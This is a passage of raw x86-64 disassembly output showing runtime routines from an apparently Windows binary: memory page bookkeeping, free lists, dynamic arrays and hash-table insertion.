    6d8c29a2:	f6 07 01             	testb  $0x1,(%rdi)
    6d8c29a5:	75 57                	jne    0x6d8c29fe
    6d8c29a7:	48 81 7f 08 c0 0f 00 	cmpq   $0xfc0,0x8(%rdi)
    6d8c29ae:	00 
    6d8c29af:	7e 4d                	jle    0x6d8c29fe
    6d8c29b1:	49 81 f9 ff ff ff 3e 	cmp    $0x3effffff,%r9
    6d8c29b8:	7f 44                	jg     0x6d8c29fe
    6d8c29ba:	48 89 fa             	mov    %rdi,%rdx
    6d8c29bd:	48 89 f1             	mov    %rsi,%rcx
    6d8c29c0:	e8 1f fe ff ff       	call   0x6d8c27e4
    6d8c29c5:	48 8b 47 08          	mov    0x8(%rdi),%rax
    6d8c29c9:	4c 89 e2             	mov    %r12,%rdx
    6d8c29cc:	48 89 e9             	mov    %rbp,%rcx
    6d8c29cf:	48 01 43 08          	add    %rax,0x8(%rbx)
    6d8c29d3:	e8 bf fe ff ff       	call   0x6d8c2897
    6d8c29d8:	48 81 7b 08 00 00 00 	cmpq   $0x3f000000,0x8(%rbx)
    6d8c29df:	3f 
    6d8c29e0:	7e 1c                	jle    0x6d8c29fe
    6d8c29e2:	48 89 da             	mov    %rbx,%rdx
    6d8c29e5:	48 89 f1             	mov    %rsi,%rcx
    6d8c29e8:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
    6d8c29ee:	e8 92 f6 ff ff       	call   0x6d8c2085
    6d8c29f3:	48 89 f1             	mov    %rsi,%rcx
    6d8c29f6:	48 89 c2             	mov    %rax,%rdx
    6d8c29f9:	e8 0e f7 ff ff       	call   0x6d8c210c
    6d8c29fe:	48 89 da             	mov    %rbx,%rdx
    6d8c2a01:	48 89 f1             	mov    %rsi,%rcx
    6d8c2a04:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2a08:	5b                   	pop    %rbx
    6d8c2a09:	5e                   	pop    %rsi
    6d8c2a0a:	5f                   	pop    %rdi
    6d8c2a0b:	5d                   	pop    %rbp
    6d8c2a0c:	41 5c                	pop    %r12
    6d8c2a0e:	e9 f9 f6 ff ff       	jmp    0x6d8c210c
    6d8c2a13:	57                   	push   %rdi
    6d8c2a14:	56                   	push   %rsi
    6d8c2a15:	53                   	push   %rbx
    6d8c2a16:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2a1a:	48 89 d6             	mov    %rdx,%rsi
    6d8c2a1d:	48 8b 12             	mov    (%rdx),%rdx
    6d8c2a20:	48 89 cb             	mov    %rcx,%rbx
    6d8c2a23:	4c 89 c7             	mov    %r8,%rdi
    6d8c2a26:	48 3b 12             	cmp    (%rdx),%rdx
    6d8c2a29:	0f 84 f0 00 00 00    	je     0x6d8c2b1f
    6d8c2a2f:	4c 3b 42 10          	cmp    0x10(%rdx),%r8
    6d8c2a33:	48 89 91 b8 28 00 00 	mov    %rdx,0x28b8(%rcx)
    6d8c2a3a:	72 0e                	jb     0x6d8c2a4a
    6d8c2a3c:	48 89 91 b0 28 00 00 	mov    %rdx,0x28b0(%rcx)
    6d8c2a43:	48 8b 06             	mov    (%rsi),%rax
    6d8c2a46:	48 8d 50 08          	lea    0x8(%rax),%rdx
    6d8c2a4a:	49 89 f8             	mov    %rdi,%r8
    6d8c2a4d:	48 89 d9             	mov    %rbx,%rcx
    6d8c2a50:	e8 be ff ff ff       	call   0x6d8c2a13
    6d8c2a55:	48 8b 16             	mov    (%rsi),%rdx
    6d8c2a58:	48 3b 93 b8 28 00 00 	cmp    0x28b8(%rbx),%rdx
    6d8c2a5f:	75 12                	jne    0x6d8c2a73
    6d8c2a61:	48 8b 83 b0 28 00 00 	mov    0x28b0(%rbx),%rax
    6d8c2a68:	48 3b 00             	cmp    (%rax),%rax
    6d8c2a6b:	74 06                	je     0x6d8c2a73
    6d8c2a6d:	48 3b 78 10          	cmp    0x10(%rax),%rdi
    6d8c2a71:	74 16                	je     0x6d8c2a89
    6d8c2a73:	48 8b 42 20          	mov    0x20(%rdx),%rax
    6d8c2a77:	4c 8b 02             	mov    (%rdx),%r8
    6d8c2a7a:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
    6d8c2a7e:	48 ff c8             	dec    %rax
    6d8c2a81:	49 39 40 20          	cmp    %rax,0x20(%r8)
    6d8c2a85:	7d 45                	jge    0x6d8c2acc
    6d8c2a87:	eb 49                	jmp    0x6d8c2ad2
    6d8c2a89:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
    6d8c2a8d:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    6d8c2a91:	48 89 48 10          	mov    %rcx,0x10(%rax)
    6d8c2a95:	48 89 d9             	mov    %rbx,%rcx
    6d8c2a98:	48 89 50 18          	mov    %rdx,0x18(%rax)
    6d8c2a9c:	e8 35 f9 ff ff       	call   0x6d8c23d6
    6d8c2aa1:	48 89 83 b0 28 00 00 	mov    %rax,0x28b0(%rbx)
    6d8c2aa8:	48 8b 06             	mov    (%rsi),%rax
    6d8c2aab:	48 8b 40 08          	mov    0x8(%rax),%rax
    6d8c2aaf:	48 89 06             	mov    %rax,(%rsi)
    6d8c2ab2:	48 8b 83 b8 28 00 00 	mov    0x28b8(%rbx),%rax
    6d8c2ab9:	48 8b 93 c0 28 00 00 	mov    0x28c0(%rbx),%rdx
    6d8c2ac0:	48 89 10             	mov    %rdx,(%rax)
    6d8c2ac3:	48 89 83 c0 28 00 00 	mov    %rax,0x28c0(%rbx)
    6d8c2aca:	eb 53                	jmp    0x6d8c2b1f
    6d8c2acc:	48 3b 41 20          	cmp    0x20(%rcx),%rax
    6d8c2ad0:	7e 4d                	jle    0x6d8c2b1f
    6d8c2ad2:	48 89 42 20          	mov    %rax,0x20(%rdx)
    6d8c2ad6:	48 3b 41 20          	cmp    0x20(%rcx),%rax
    6d8c2ada:	7d 04                	jge    0x6d8c2ae0
    6d8c2adc:	48 89 41 20          	mov    %rax,0x20(%rcx)
    6d8c2ae0:	48 89 f1             	mov    %rsi,%rcx
    6d8c2ae3:	e8 72 f9 ff ff       	call   0x6d8c245a
    6d8c2ae8:	48 8b 06             	mov    (%rsi),%rax
    6d8c2aeb:	48 8d 48 08          	lea    0x8(%rax),%rcx
    6d8c2aef:	e8 66 f9 ff ff       	call   0x6d8c245a
    6d8c2af4:	48 8b 06             	mov    (%rsi),%rax
    6d8c2af7:	48 8b 48 08          	mov    0x8(%rax),%rcx
    6d8c2afb:	48 83 c1 08          	add    $0x8,%rcx
    6d8c2aff:	e8 56 f9 ff ff       	call   0x6d8c245a
    6d8c2b04:	48 89 f1             	mov    %rsi,%rcx
    6d8c2b07:	e8 70 f9 ff ff       	call   0x6d8c247c
    6d8c2b0c:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c2b0f:	48 83 c1 08          	add    $0x8,%rcx
    6d8c2b13:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2b17:	5b                   	pop    %rbx
    6d8c2b18:	5e                   	pop    %rsi
    6d8c2b19:	5f                   	pop    %rdi
    6d8c2b1a:	e9 5d f9 ff ff       	jmp    0x6d8c247c
    6d8c2b1f:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2b23:	5b                   	pop    %rbx
    6d8c2b24:	5e                   	pop    %rsi
    6d8c2b25:	5f                   	pop    %rdi
    6d8c2b26:	c3                   	ret
    6d8c2b27:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2b2b:	4c 8b 5a 08          	mov    0x8(%rdx),%r11
    6d8c2b2f:	49 89 c9             	mov    %rcx,%r9
    6d8c2b32:	49 89 d2             	mov    %rdx,%r10
    6d8c2b35:	48 c1 fa 0c          	sar    $0xc,%rdx
    6d8c2b39:	48 8d 89 a8 20 00 00 	lea    0x20a8(%rcx),%rcx
    6d8c2b40:	e8 52 fd ff ff       	call   0x6d8c2897
    6d8c2b45:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    6d8c2b4b:	49 8b 81 80 20 00 00 	mov    0x2080(%r9),%rax
    6d8c2b52:	4c 89 d1             	mov    %r10,%rcx
    6d8c2b55:	49 39 81 88 20 00 00 	cmp    %rax,0x2088(%r9)
    6d8c2b5c:	48 89 c2             	mov    %rax,%rdx
    6d8c2b5f:	49 0f 4d 91 88 20 00 	cmovge 0x2088(%r9),%rdx
    6d8c2b66:	00 
    6d8c2b67:	4c 29 d8             	sub    %r11,%rax
    6d8c2b6a:	49 89 81 80 20 00 00 	mov    %rax,0x2080(%r9)
    6d8c2b71:	49 89 91 88 20 00 00 	mov    %rdx,0x2088(%r9)
    6d8c2b78:	31 d2                	xor    %edx,%edx
    6d8c2b7a:	ff 15 24 e7 10 00    	call   *0x10e724(%rip)        # 0x6d9d12a4
    6d8c2b80:	85 c0                	test   %eax,%eax
    6d8c2b82:	75 17                	jne    0x6d8c2b9b
    6d8c2b84:	48 8d 0d e5 f5 00 00 	lea    0xf5e5(%rip),%rcx        # 0x6d8d2170
    6d8c2b8b:	e8 c0 b9 00 00       	call   0x6d8ce550
    6d8c2b90:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c2b95:	e8 ee b9 00 00       	call   0x6d8ce588
    6d8c2b9a:	90                   	nop
    6d8c2b9b:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2b9f:	c3                   	ret
    6d8c2ba0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2ba4:	49 89 d2             	mov    %rdx,%r10
    6d8c2ba7:	49 89 cb             	mov    %rcx,%r11
    6d8c2baa:	48 8b 89 98 20 00 00 	mov    0x2098(%rcx),%rcx
    6d8c2bb1:	49 81 e2 00 f0 ff ff 	and    $0xfffffffffffff000,%r10
    6d8c2bb8:	49 8b 42 08          	mov    0x8(%r10),%rax
    6d8c2bbc:	48 29 c1             	sub    %rax,%rcx
    6d8c2bbf:	48 3d c0 0f 00 00    	cmp    $0xfc0,%rax
    6d8c2bc5:	49 89 8b 98 20 00 00 	mov    %rcx,0x2098(%r11)
    6d8c2bcc:	7e 32                	jle    0x6d8c2c00
    6d8c2bce:	4c 89 d9             	mov    %r11,%rcx
    6d8c2bd1:	e8 00 f8 ff ff       	call   0x6d8c23d6
    6d8c2bd6:	49 89 83 b0 28 00 00 	mov    %rax,0x28b0(%r11)
    6d8c2bdd:	49 8d 93 a8 28 00 00 	lea    0x28a8(%r11),%rdx
    6d8c2be4:	4d 8d 42 20          	lea    0x20(%r10),%r8
    6d8c2be8:	e8 26 fe ff ff       	call   0x6d8c2a13
    6d8c2bed:	49 81 7a 08 00 00 00 	cmpq   $0x3f000000,0x8(%r10)
    6d8c2bf4:	3f 
    6d8c2bf5:	0f 8e ba 00 00 00    	jle    0x6d8c2cb5
    6d8c2bfb:	e9 c4 00 00 00       	jmp    0x6d8c2cc4
    6d8c2c00:	49 8b 4a 20          	mov    0x20(%r10),%rcx
    6d8c2c04:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)
    6d8c2c0b:	00 
    6d8c2c0c:	48 89 0a             	mov    %rcx,(%rdx)
    6d8c2c0f:	49 89 52 20          	mov    %rdx,0x20(%r10)
    6d8c2c13:	49 8b 52 28          	mov    0x28(%r10),%rdx
    6d8c2c17:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
    6d8c2c1b:	48 39 c2             	cmp    %rax,%rdx
    6d8c2c1e:	7c 13                	jl     0x6d8c2c33
    6d8c2c20:	48 81 f9 c0 0f 00 00 	cmp    $0xfc0,%rcx
    6d8c2c27:	49 89 4a 28          	mov    %rcx,0x28(%r10)
    6d8c2c2b:	0f 85 a2 00 00 00    	jne    0x6d8c2cd3
    6d8c2c31:	eb 2a                	jmp    0x6d8c2c5d
    6d8c2c33:	48 99                	cqto
    6d8c2c35:	41 b8 10 00 00 00    	mov    $0x10,%r8d
    6d8c2c3b:	49 f7 f8             	idiv   %r8
    6d8c2c3e:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
    6d8c2c42:	48 8b 42 10          	mov    0x10(%rdx),%rax
    6d8c2c46:	48 85 c0             	test   %rax,%rax
    6d8c2c49:	49 89 42 10          	mov    %rax,0x10(%r10)
    6d8c2c4d:	74 04                	je     0x6d8c2c53
    6d8c2c4f:	4c 89 50 18          	mov    %r10,0x18(%rax)
    6d8c2c53:	4c 89 52 10          	mov    %r10,0x10(%rdx)
    6d8c2c57:	49 89 4a 28          	mov    %rcx,0x28(%r10)
    6d8c2c5b:	eb 76                	jmp    0x6d8c2cd3
    6d8c2c5d:	48 99                	cqto
    6d8c2c5f:	b9 10 00 00 00       	mov    $0x10,%ecx
    6d8c2c64:	48 f7 f9             	idiv   %rcx
    6d8c2c67:	49 8d 14 c3          	lea    (%r11,%rax,8),%rdx
    6d8c2c6b:	49 8b 42 10          	mov    0x10(%r10),%rax
    6d8c2c6f:	4c 3b 52 10          	cmp    0x10(%rdx),%r10
    6d8c2c73:	74 17                	je     0x6d8c2c8c
    6d8c2c75:	49 8b 52 18          	mov    0x18(%r10),%rdx
    6d8c2c79:	48 89 42 10          	mov    %rax,0x10(%rdx)
    6d8c2c7d:	49 8b 42 10          	mov    0x10(%r10),%rax
    6d8c2c81:	48 85 c0             	test   %rax,%rax
    6d8c2c84:	74 17                	je     0x6d8c2c9d
    6d8c2c86:	48 89 50 18          	mov    %rdx,0x18(%rax)
    6d8c2c8a:	eb 11                	jmp    0x6d8c2c9d
    6d8c2c8c:	48 85 c0             	test   %rax,%rax
    6d8c2c8f:	48 89 42 10          	mov    %rax,0x10(%rdx)
    6d8c2c93:	74 08                	je     0x6d8c2c9d
    6d8c2c95:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    6d8c2c9c:	00 
    6d8c2c9d:	49 c7 42 10 00 00 00 	movq   $0x0,0x10(%r10)
    6d8c2ca4:	00 
    6d8c2ca5:	49 c7 42 18 00 00 00 	movq   $0x0,0x18(%r10)
    6d8c2cac:	00 
    6d8c2cad:	49 c7 42 08 00 10 00 	movq   $0x1000,0x8(%r10)
    6d8c2cb4:	00 
    6d8c2cb5:	4c 89 d2             	mov    %r10,%rdx
    6d8c2cb8:	4c 89 d9             	mov    %r11,%rcx
    6d8c2cbb:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2cbf:	e9 0e fc ff ff       	jmp    0x6d8c28d2
    6d8c2cc4:	4c 89 d2             	mov    %r10,%rdx
    6d8c2cc7:	4c 89 d9             	mov    %r11,%rcx
    6d8c2cca:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2cce:	e9 54 fe ff ff       	jmp    0x6d8c2b27
    6d8c2cd3:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2cd7:	c3                   	ret
    6d8c2cd8:	48 83 ea 10          	sub    $0x10,%rdx
    6d8c2cdc:	e9 bf fe ff ff       	jmp    0x6d8c2ba0
    6d8c2ce1:	48 89 ca             	mov    %rcx,%rdx
    6d8c2ce4:	48 8d 0d 3d 1b 10 00 	lea    0x101b3d(%rip),%rcx        # 0x6d9c4828
    6d8c2ceb:	eb eb                	jmp    0x6d8c2cd8
    6d8c2ced:	41 54                	push   %r12
    6d8c2cef:	55                   	push   %rbp
    6d8c2cf0:	57                   	push   %rdi
    6d8c2cf1:	56                   	push   %rsi
    6d8c2cf2:	53                   	push   %rbx
    6d8c2cf3:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2cf7:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6d8c2cfb:	48 3b 01             	cmp    (%rcx),%rax
    6d8c2cfe:	48 89 cb             	mov    %rcx,%rbx
    6d8c2d01:	49 89 d4             	mov    %rdx,%r12
    6d8c2d04:	7f 44                	jg     0x6d8c2d4a
    6d8c2d06:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
    6d8c2d0a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    6d8c2d10:	48 99                	cqto
    6d8c2d12:	49 f7 f8             	idiv   %r8
    6d8c2d15:	48 89 41 08          	mov    %rax,0x8(%rcx)
    6d8c2d19:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    6d8c2d20:	00 
    6d8c2d21:	e8 af fa ff ff       	call   0x6d8c27d5
    6d8c2d26:	48 8b 73 10          	mov    0x10(%rbx),%rsi
    6d8c2d2a:	48 89 c5             	mov    %rax,%rbp
    6d8c2d2d:	48 8b 03             	mov    (%rbx),%rax
    6d8c2d30:	48 89 ef             	mov    %rbp,%rdi
    6d8c2d33:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    6d8c2d3a:	00 
    6d8c2d3b:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c2d3d:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
    6d8c2d41:	e8 9b ff ff ff       	call   0x6d8c2ce1
    6d8c2d46:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
    6d8c2d4a:	48 8b 03             	mov    (%rbx),%rax
    6d8c2d4d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    6d8c2d51:	4c 89 24 c2          	mov    %r12,(%rdx,%rax,8)
    6d8c2d55:	48 ff c0             	inc    %rax
    6d8c2d58:	48 89 03             	mov    %rax,(%rbx)
    6d8c2d5b:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2d5f:	5b                   	pop    %rbx
    6d8c2d60:	5e                   	pop    %rsi
    6d8c2d61:	5f                   	pop    %rdi
    6d8c2d62:	5d                   	pop    %rbp
    6d8c2d63:	41 5c                	pop    %r12
    6d8c2d65:	c3                   	ret
    6d8c2d66:	e9 76 ff ff ff       	jmp    0x6d8c2ce1
    6d8c2d6b:	48 8b 02             	mov    (%rdx),%rax
    6d8c2d6e:	a8 04                	test   $0x4,%al
    6d8c2d70:	75 0c                	jne    0x6d8c2d7e
    6d8c2d72:	48 83 c8 04          	or     $0x4,%rax
    6d8c2d76:	48 89 02             	mov    %rax,(%rdx)
    6d8c2d79:	e9 6f ff ff ff       	jmp    0x6d8c2ced
    6d8c2d7e:	c3                   	ret
    6d8c2d7f:	48 8b 01             	mov    (%rcx),%rax
    6d8c2d82:	48 83 e8 08          	sub    $0x8,%rax
    6d8c2d86:	48 89 ca             	mov    %rcx,%rdx
    6d8c2d89:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c2d8d:	48 89 01             	mov    %rax,(%rcx)
    6d8c2d90:	77 09                	ja     0x6d8c2d9b
    6d8c2d92:	48 8d 0d 3f 1a 10 00 	lea    0x101a3f(%rip),%rcx        # 0x6d9c47d8
    6d8c2d99:	eb d0                	jmp    0x6d8c2d6b
    6d8c2d9b:	c3                   	ret
    6d8c2d9c:	56                   	push   %rsi
    6d8c2d9d:	53                   	push   %rbx
    6d8c2d9e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2da2:	48 85 d2             	test   %rdx,%rdx
    6d8c2da5:	48 89 ce             	mov    %rcx,%rsi
    6d8c2da8:	48 89 d3             	mov    %rdx,%rbx
    6d8c2dab:	74 05                	je     0x6d8c2db2
    6d8c2dad:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
    6d8c2db2:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c2db5:	48 85 c9             	test   %rcx,%rcx
    6d8c2db8:	74 09                	je     0x6d8c2dc3
    6d8c2dba:	48 83 e9 10          	sub    $0x10,%rcx
    6d8c2dbe:	e8 bc ff ff ff       	call   0x6d8c2d7f
    6d8c2dc3:	48 89 1e             	mov    %rbx,(%rsi)
    6d8c2dc6:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2dca:	5b                   	pop    %rbx
    6d8c2dcb:	5e                   	pop    %rsi
    6d8c2dcc:	c3                   	ret
    6d8c2dcd:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c2dd1:	49 8b 40 08          	mov    0x8(%r8),%rax
    6d8c2dd5:	48 21 c8             	and    %rcx,%rax
    6d8c2dd8:	4c 8d 0c c2          	lea    (%rdx,%rax,8),%r9
    6d8c2ddc:	49 83 39 00          	cmpq   $0x0,(%r9)
    6d8c2de0:	75 04                	jne    0x6d8c2de6
    6d8c2de2:	4d 89 01             	mov    %r8,(%r9)
    6d8c2de5:	c3                   	ret
    6d8c2de6:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6d8c2dea:	48 ff c0             	inc    %rax
    6d8c2ded:	48 21 c8             	and    %rcx,%rax
    6d8c2df0:	eb e6                	jmp    0x6d8c2dd8
    6d8c2df2:	57                   	push   %rdi
    6d8c2df3:	56                   	push   %rsi
    6d8c2df4:	53                   	push   %rbx
    6d8c2df5:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2df9:	48 8b 71 08          	mov    0x8(%rcx),%rsi
    6d8c2dfd:	48 8d 44 36 01       	lea    0x1(%rsi,%rsi,1),%rax
    6d8c2e02:	48 89 cb             	mov    %rcx,%rbx
    6d8c2e05:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
    6d8c2e09:	48 89 43 08          	mov    %rax,0x8(%rbx)
    6d8c2e0d:	48 c1 e1 04          	shl    $0x4,%rcx
    6d8c2e11:	e8 8c f8 ff ff       	call   0x6d8c26a2
    6d8c2e16:	45 31 d2             	xor    %r10d,%r10d
    6d8c2e19:	48 89 c7             	mov    %rax,%rdi
    6d8c2e1c:	49 39 f2             	cmp    %rsi,%r10
    6d8c2e1f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c2e23:	7e 11                	jle    0x6d8c2e36
    6d8c2e25:	e8 b7 fe ff ff       	call   0x6d8c2ce1
    6d8c2e2a:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
    6d8c2e2e:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2e32:	5b                   	pop    %rbx
    6d8c2e33:	5e                   	pop    %rsi
    6d8c2e34:	5f                   	pop    %rdi
    6d8c2e35:	c3                   	ret
    6d8c2e36:	4e 8b 04 d1          	mov    (%rcx,%r10,8),%r8
    6d8c2e3a:	4d 85 c0             	test   %r8,%r8
    6d8c2e3d:	74 0b                	je     0x6d8c2e4a
    6d8c2e3f:	48 89 fa             	mov    %rdi,%rdx
    6d8c2e42:	48 89 d9             	mov    %rbx,%rcx
    6d8c2e45:	e8 83 ff ff ff       	call   0x6d8c2dcd
    6d8c2e4a:	49 ff c2             	inc    %r10
    6d8c2e4d:	eb cd                	jmp    0x6d8c2e1c
    6d8c2e4f:	57                   	push   %rdi
    6d8c2e50:	56                   	push   %rsi
    6d8c2e51:	53                   	push   %rbx
    6d8c2e52:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2e56:	48 89 cb             	mov    %rcx,%rbx
    6d8c2e59:	48 8b 49 08          	mov    0x8(%rcx),%rcx
    6d8c2e5d:	48 89 d6             	mov    %rdx,%rsi
    6d8c2e60:	49 89 c8             	mov    %rcx,%r8
    6d8c2e63:	49 21 d0             	and    %rdx,%r8
    6d8c2e66:	48 8b 53 18          	mov    0x18(%rbx),%rdx
    6d8c2e6a:	4a 8b 04 c2          	mov    (%rdx,%r8,8),%rax
    6d8c2e6e:	48 85 c0             	test   %rax,%rax
    6d8c2e71:	74 12                	je     0x6d8c2e85
    6d8c2e73:	48 39 70 08          	cmp    %rsi,0x8(%rax)
    6d8c2e77:	74 7f                	je     0x6d8c2ef8
    6d8c2e79:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
    6d8c2e7d:	49 ff c0             	inc    %r8
    6d8c2e80:	49 21 c8             	and    %rcx,%r8
    6d8c2e83:	eb e5                	jmp    0x6d8c2e6a
    6d8c2e85:	48 8b 03             	mov    (%rbx),%rax
    6d8c2e88:	48 ff c1             	inc    %rcx
    6d8c2e8b:	4c 8d 04 09          	lea    (%rcx,%rcx,1),%r8
    6d8c2e8f:	48 8d 14 40          	lea    (%rax,%rax,2),%rdx
    6d8c2e93:	49 39 d0             	cmp    %rdx,%r8
    6d8c2e96:	7c 09                	jl     0x6d8c2ea1
    6d8c2e98:	48 29 c1             	sub    %rax,%rcx
    6d8c2e9b:	48 83 f9 03          	cmp    $0x3,%rcx
    6d8c2e9f:	7f 08                	jg     0x6d8c2ea9
    6d8c2ea1:	48 89 d9             	mov    %rbx,%rcx
    6d8c2ea4:	e8 49 ff ff ff       	call   0x6d8c2df2
    6d8c2ea9:	48 8b 53 08          	mov    0x8(%rbx),%rdx
    6d8c2ead:	48 89 f0             	mov    %rsi,%rax
    6d8c2eb0:	48 ff 03             	incq   (%rbx)
    6d8c2eb3:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    6d8c2eb7:	48 21 d0             	and    %rdx,%rax
    6d8c2eba:	48 83 3c c1 00       	cmpq   $0x0,(%rcx,%rax,8)
    6d8c2ebf:	48 8d 3c c5 00 00 00 	lea    0x0(,%rax,8),%rdi
    6d8c2ec6:	00 
    6d8c2ec7:	75 23                	jne    0x6d8c2eec
    6d8c2ec9:	b9 30 00 00 00       	mov    $0x30,%ecx
    6d8c2ece:	e8 cf f7 ff ff       	call   0x6d8c26a2
    6d8c2ed3:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    6d8c2ed7:	48 89 70 08          	mov    %rsi,0x8(%rax)
    6d8c2edb:	48 89 10             	mov    %rdx,(%rax)
    6d8c2ede:	48 8b 53 18          	mov    0x18(%rbx),%rdx
    6d8c2ee2:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c2ee6:	48 89 04 3a          	mov    %rax,(%rdx,%rdi,1)
    6d8c2eea:	eb 0c                	jmp    0x6d8c2ef8
    6d8c2eec:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
    6d8c2ef0:	48 ff c0             	inc    %rax
    6d8c2ef3:	48 21 d0             	and    %rdx,%rax
    6d8c2ef6:	eb c2                	jmp    0x6d8c2eba
    6d8c2ef8:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2efc:	5b                   	pop    %rbx
    6d8c2efd:	5e                   	pop    %rsi
    6d8c2efe:	5f                   	pop    %rdi
    6d8c2eff:	c3                   	ret
    6d8c2f00:	53                   	push   %rbx
    6d8c2f01:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c2f05:	48 89 d3             	mov    %rdx,%rbx
    6d8c2f08:	48 c1 ea 0c          	shr    $0xc,%rdx
    6d8c2f0c:	e8 3e ff ff ff       	call   0x6d8c2e4f
    6d8c2f11:	48 c1 eb 04          	shr    $0x4,%rbx
    6d8c2f15:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c2f1a:	0f b6 cb             	movzbl %bl,%ecx
    6d8c2f1d:	49 89 c8             	mov    %rcx,%r8
    6d8c2f20:	48 d3 e2             	shl    %cl,%rdx
    6d8c2f23:	49 c1 e8 06          	shr    $0x6,%r8
    6d8c2f27:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
    6d8c2f2c:	48 83 c4 20          	add    $0x20,%rsp
    6d8c2f30:	5b                   	pop    %rbx
    6d8c2f31:	c3                   	ret
    6d8c2f32:	48 8b 42 10          	mov    0x10(%rdx),%rax
    6d8c2f36:	48 8b 00             	mov    (%rax),%rax
    6d8c2f39:	48 83 f8 02          	cmp    $0x2,%rax
    6d8c2f3d:	74 23                	je     0x6d8c2f62
    6d8c2f3f:	7f 07                	jg     0x6d8c2f48
    6d8c2f41:	48 ff c8             	dec    %rax
    6d8c2f44:	74 12                	je     0x6d8c2f58
    6d8c2f46:	eb 0c                	jmp    0x6d8c2f54
    6d8c2f48:	48 83 f8 04          	cmp    $0x4,%rax
    6d8c2f4c:	74 1e                	je     0x6d8c2f6c
    6d8c2f4e:	48 83 f8 08          	cmp    $0x8,%rax
    6d8c2f52:	74 21                	je     0x6d8c2f75
    6d8c2f54:	31 c0                	xor    %eax,%eax
    6d8c2f56:	eb 25                	jmp    0x6d8c2f7d
    6d8c2f58:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6d8c2f5c:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
    6d8c2f60:	eb 1b                	jmp    0x6d8c2f7d
    6d8c2f62:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6d8c2f66:	0f b7 04 08          	movzwl (%rax,%rcx,1),%eax
    6d8c2f6a:	eb 11                	jmp    0x6d8c2f7d
    6d8c2f6c:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6d8c2f70:	8b 04 08             	mov    (%rax,%rcx,1),%eax
    6d8c2f73:	eb 08                	jmp    0x6d8c2f7d
    6d8c2f75:	48 8b 42 08          	mov    0x8(%rdx),%rax
    6d8c2f79:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
    6d8c2f7d:	c3                   	ret
    6d8c2f7e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c2f82:	e8 ab ff ff ff       	call   0x6d8c2f32
    6d8c2f87:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
    6d8c2f8b:	48 8b 52 28          	mov    0x28(%rdx),%rdx
    6d8c2f8f:	48 39 c1             	cmp    %rax,%rcx
    6d8c2f92:	76 09                	jbe    0x6d8c2f9d
    6d8c2f94:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
    6d8c2f98:	48 85 c0             	test   %rax,%rax
    6d8c2f9b:	75 04                	jne    0x6d8c2fa1
    6d8c2f9d:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
    6d8c2fa1:	48 83 c4 28          	add    $0x28,%rsp
    6d8c2fa5:	c3                   	ret
    6d8c2fa6:	48 85 d2             	test   %rdx,%rdx
    6d8c2fa9:	74 0b                	je     0x6d8c2fb6
    6d8c2fab:	48 8d 4c 11 ff       	lea    -0x1(%rcx,%rdx,1),%rcx
    6d8c2fb0:	48 f7 da             	neg    %rdx
    6d8c2fb3:	48 21 d1             	and    %rdx,%rcx
    6d8c2fb6:	48 89 c8             	mov    %rcx,%rax
    6d8c2fb9:	c3                   	ret
    6d8c2fba:	4c 8b 49 08          	mov    0x8(%rcx),%r9
